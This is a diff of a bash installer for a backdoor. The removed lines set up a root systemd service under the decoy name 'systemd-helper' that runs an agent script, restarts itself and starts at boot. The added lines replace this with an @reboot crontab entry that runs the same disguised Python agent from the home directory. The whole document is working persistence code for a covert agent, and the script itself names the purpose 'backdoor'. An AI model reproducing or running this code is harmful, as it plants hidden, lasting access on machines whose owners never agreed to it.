@@ -1,55 +1,22 @@
 #!/bin/bash
 
-# === CONFIG ===
-SERVICE_NAME="systemd-helper"
-AGENT_NAME="agent.py"
-INSTALL_PATH="/usr/local/bin"
-SERVICE_PATH="/etc/systemd/system"
+AGENT_PATH="$HOME/systemd-helper.py"
+CRON_MARKER="# system-helper-cron"
 
-echo "[+] Installing backdoor service..."
+echo "[+] Installing cron persistence..."
 
-# === Move agent ===
-echo "[+] Moving agent to $INSTALL_PATH..."
-sudo mv ~/$AGENT_NAME $INSTALL_PATH/$SERVICE_NAME.py
-
-# === Move config ===
-if [ -f ~/config.json ]; then
-    echo "[+] Moving config.json..."
-    sudo mv ~/config.json $INSTALL_PATH/config.json
+# Check if agent exists
+if [ ! -f "$AGENT_PATH" ]; then
+    echo "[-] systemd-helper.py not found in home directory!"
+    exit 1
 fi
 
-# === Set permissions ===
-echo "[+] Setting permissions..."
-sudo chmod +x $INSTALL_PATH/$SERVICE_NAME.py
+# Add cron job (avoid duplicates)
+(crontab -l 2>/dev/null | grep -v "$CRON_MARKER"; \
+echo "@reboot /usr/bin/python $AGENT_PATH & $CRON_MARKER") | crontab -
 
-# === Create systemd service ===
-echo "[+] Creating systemd service..."
+echo "[+] Cron job installed!"
 
-sudo bash -c "cat > $SERVICE_PATH/$SERVICE_NAME.service" <<EOF
-[Unit]
-Description=System Helper Service
-After=network.target
-
-[Service]
-ExecStart=/usr/bin/python $INSTALL_PATH/$SERVICE_NAME.py
-Restart=always
-User=root
-
-[Install]
-WantedBy=multi-user.target
-EOF
-
-# === Reload systemd ===
-echo "[+] Reloading systemd..."
-sudo systemctl daemon-reexec
-sudo systemctl daemon-reload
-
-# === Enable service ===
-echo "[+] Enabling service..."
-sudo systemctl enable $SERVICE_NAME.service
-
-# === Start service ===
-echo "[+] Starting service..."
-sudo systemctl start $SERVICE_NAME.service
-
-echo "[+] Installation complete!"
+# Show current crontab
+echo "[+] Current crontab:"
+crontab -l
